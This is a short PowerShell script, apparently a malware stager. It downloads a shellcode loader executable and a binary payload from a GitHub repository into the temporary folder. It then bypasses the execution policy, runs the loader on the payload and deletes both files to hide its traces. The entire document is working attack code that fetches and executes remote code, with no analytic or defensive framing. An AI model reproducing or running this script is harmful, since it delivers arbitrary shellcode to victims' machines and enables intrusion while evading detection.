# Define URLs or local paths for the executable and binary payload
$exeUrl = "https://github.com/Magturn/Bat/raw/refs/heads/main/ShellLoad.exe"
$binUrl = "https://github.com/Magturn/Bat/raw/refs/heads/main/Jat.bin"

# Define local paths for saving the files
$exePath = "$env:TEMP\shellloader.exe"
$binPath = "$env:TEMP\coder.bin"

# Function to download a file
Function Download-File {
    param ([string]$url, [string]$output)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $output)
        Write-Host "[+] Downloaded: $url -> $output"
    } catch {
        Write-Host "[-] Failed to download: $url"
        exit 1
    }
}

# Download both files
Download-File -url $exeUrl -output $exePath
Download-File -url $binUrl -output $binPath

# Ensure execution permission (if needed)
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Run shellloader.exe with coder.bin
Start-Process -FilePath $exePath -ArgumentList $binPath -NoNewWindow -Wait

# Optional: Cleanup after execution
Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
Remove-Item -Path $binPath -Force -ErrorAction SilentlyContinue

Write-Host "[+] Execution complete."
